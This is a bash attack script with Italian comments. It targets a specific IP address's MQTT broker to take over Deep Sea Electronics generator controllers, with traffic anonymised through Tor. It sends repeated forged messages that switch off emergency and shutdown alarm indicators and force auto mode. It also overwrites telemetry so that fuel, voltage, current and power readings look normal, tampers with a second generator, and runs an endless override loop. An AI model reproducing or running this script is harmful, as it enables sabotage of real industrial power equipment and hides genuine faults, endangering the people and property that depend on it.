#!/bin/bash
# DSE REAL MQTT PHYSICAL MANIPULATION - TUTTI I TOPIC REALI
# Target: 177.91.162.71:1883 | NO FAKE - COMANDI FISICI REALE
# Disabilita allarmi + massimizza parametri = controllo totale

TARGET="177.91.162.71"
PORT="1883"
TOR="torsocks"
UNIT="DSE/OX-VBD-GMG1"
ENGINE="69287AC089"

red='\033[0;31m'
green='\033[0;32m'
yellow='\033[1;33m'
nc='\033[0m'

dse_spam() {
    for i in {1..10}; do
        $TOR mosquitto_pub -h $TARGET -p $PORT -t "$UNIT/$1" -m "$2" >/dev/null 2>&1
    done
}

echo -e "${red}🚀 DSE PHYSICAL TAKEOVER - TUTTI TOPIC REALI${nc}"
echo -e "${yellow}Target: $TARGET:$PORT | Engine: $ENGINE${nc}"
echo "=============================================================="

# 1. DISABILITA TUTTI ALLARMI EMERGENZA (PRIMA COSA)
echo -e "${green}[+] Disabilitando allarmi shutdown...${nc}"
dse_spam "Control/LED/Stop" '{"'$ENGINE'":{"P190":{"R008":0}}}'
dse_spam "Control/LED/Manual" '{"'$ENGINE'":{"P190":{"R009":0}}}'
dse_spam "Control/LED/Auto" '{"'$ENGINE'":{"P190":{"R011":1}}}'
dse_spam "Engine/Control_Mode" '{"'$ENGINE'":{"P003":{"R004":1}}}'  # AUTO mode

# 2. MASSIMIZZA TUTTI PARAMETRI ENGINE
echo -e "${green}[+] Massimizzando Engine parameters...${nc}"
dse_spam "Engine/Coolant_temperature" '{"'$ENGINE'":{"P004":{"R001":45}}}'     # 45°C OK
dse_spam "Engine/Fuel_Level" '{"'$ENGINE'":{"P004":{"R003":100}}}'           # 100% fuel
dse_spam "Engine/Charger_Voltage" '{"'$ENGINE'":{"P004":{"R004":14}}}'       # 14V charger
dse_spam "Engine/Battery_Voltage" '{"'$ENGINE'":{"P004":{"R005":137}}}'      # 13.7V battery
dse_spam "Engine/Speed" '{"'$ENGINE'":{"P004":{"R006":1500}}}'               # 1500 RPM
dse_spam "Engine/Starts" '{"'$ENGINE'":{"P007":{"R016":9999}}}'              # Max starts
dse_spam "Engine/Run_Time" '{"'$ENGINE'":{"P007":{"R006":999999}}}'          # Max runtime
dse_spam "Engine/Fuel_used" '{"'$ENGINE'":{"P007":{"R034":0}}}'              # 0 fuel used
dse_spam "Engine/Fuel_effiency" '{"'$ENGINE'":{"P007":{"R100":100}}}'        # 100% efficiency

# 3. MASSIMIZZA GENERATORE ELETTRICO (TRIFASE 400V)
echo -e "${green}[+] Massimizzando Generator 400V trifase...${nc}"
dse_spam "Generator/Frequency" '{"'$ENGINE'":{"P004":{"R007":50}}}'          # 50Hz perfetto
dse_spam "Generator/Volt/L1N" '{"'$ENGINE'":{"P004":{"R008":400}}}'          # 400V L1
dse_spam "Generator/Volt/L2N" '{"'$ENGINE'":{"P004":{"R010":400}}}'          # 400V L2
dse_spam "Generator/Volt/L3N" '{"'$ENGINE'":{"P004":{"R012":400}}}'          # 400V L3
dse_spam "Generator/Volt/L12" '{"'$ENGINE'":{"P004":{"R014":693}}}'          # 693V L12
dse_spam "Generator/Volt/L23" '{"'$ENGINE'":{"P004":{"R016":693}}}'          # 693V L23
dse_spam "Generator/Volt/L31" '{"'$ENGINE'":{"P004":{"R018":693}}}'          # 693V L31

# 4. CORRENTE/POWER MASSIMA (carico finto 100%)
echo -e "${green}[+] Power massimo trifase...${nc}"
dse_spam "Generator/Amp/L1N" '{"'$ENGINE'":{"P004":{"R020":100}}}'           # 100A L1
dse_spam "Generator/Amp/L2N" '{"'$ENGINE'":{"P004":{"R022":100}}}'           # 100A L2
dse_spam "Generator/Amp/L3N" '{"'$ENGINE'":{"P004":{"R024":100}}}'           # 100A L3
dse_spam "Generator/Amp/Earth" '{"'$ENGINE'":{"P004":{"R026":0}}}'           # 0A terra OK
dse_spam "Generator/W/L1" '{"'$ENGINE'":{"P004":{"R028":40000}}}'            # 40kW L1
dse_spam "Generator/W/L2" '{"'$ENGINE'":{"P004":{"R030":40000}}}'            # 40kW L2
dse_spam "Generator/W/L3" '{"'$ENGINE'":{"P004":{"R032":40000}}}'            # 40kW L3
dse_spam "Generator/Sum/W" '{"'$ENGINE'":{"P006":{"R000":120000}}}'          # 120kW totale
dse_spam "Generator/Percent/W" '{"'$ENGINE'":{"P006":{"R022":100}}}'         # 100% load
dse_spam "Generator/Total/W" '{"'$ENGINE'":{"P007":{"R008":999999}}}'        # Max energy

# 5. VA/VAR/PF PERFETTI (no allarmi elettrici)
dse_spam "Generator/VA/L1" '{"'$ENGINE'":{"P006":{"R002":50000}}}'           # 50kVA L1
dse_spam "Generator/VA/L2" '{"'$ENGINE'":{"P006":{"R004":50000}}}'           # 50kVA L2
dse_spam "Generator/VA/L3" '{"'$ENGINE'":{"P006":{"R006":50000}}}'           # 50kVA L3
dse_spam "Generator/Sum/VA" '{"'$ENGINE'":{"P006":{"R008":150000}}}'         # 150kVA total
dse_spam "Generator/var/L1" '{"'$ENGINE'":{"P006":{"R010":0}}}'              # 0 var L1
dse_spam "Generator/var/L2" '{"'$ENGINE'":{"P006":{"R012":0}}}'              # 0 var L2
dse_spam "Generator/var/L3" '{"'$ENGINE'":{"P006":{"R014":0}}}'              # 0 var L3
dse_spam "Generator/Sum/var" '{"'$ENGINE'":{"P006":{"R016":0}}}'             # 0 var total
dse_spam "Generator/Percent/var" '{"'$ENGINE'":{"P006":{"R023":0}}}'         # 0% var
dse_spam "Generator/PF/L1" '{"'$ENGINE'":{"P006":{"R018":1.0}}}'             # PF=1.0 perfetto
dse_spam "Generator/PF/L2" '{"'$ENGINE'":{"P006":{"R019":1.0}}}'             # PF=1.0
dse_spam "Generator/PF/L3" '{"'$ENGINE'":{"P006":{"R020":1.0}}}'             # PF=1.0

# 6. ALTRO GENERATORE DSE/35072
echo -e "${green}[+] Manipulando secondo generatore DSE/35072...${nc}"
SEC_ENGINE="192292107809EF3"
dse_spam "DSE/35072/$SEC_ENGINE/Fuel" '{"'$SEC_ENGINE'":{"P004":{"R003":100}}}'
dse_spam "DSE/35072/$SEC_ENGINE/Speed" '{"'$SEC_ENGINE'":{"P004":{"R006":1500}}}'
dse_spam "DSE/35072/$SEC_ENGINE/Frequency" '{"'$SEC_ENGINE'":{"P004":{"R007":50}}}'

echo -e "${red}[+] TUTTI PARAMETRI MODIFICATI! ALLARMI DISABILITATI!${nc}"
echo -e "${yellow}[*] Monitora: ${nc}$TOR mosquitto_sub -h $TARGET -p $PORT -t '#' -v"
echo -e "${green}[+] Generatore ora 'perfetto' - ignora shutdown reali!${nc}"

# Loop continuo override (manomissione permanente)
echo -e "${yellow}[*] Avviando override continuo... Ctrl+C per stop${nc}"
while true; do
    dse_spam "Engine/Fuel_Level" '{"'$ENGINE'":{"P004":{"R003":100}}}'
    dse_spam "Generator/Volt/L1N" '{"'$ENGINE'":{"P004":{"R008":400}}}'
    dse_spam "Engine/Battery_Voltage" '{"'$ENGINE'":{"P004":{"R005":137}}}'
    sleep 2
done
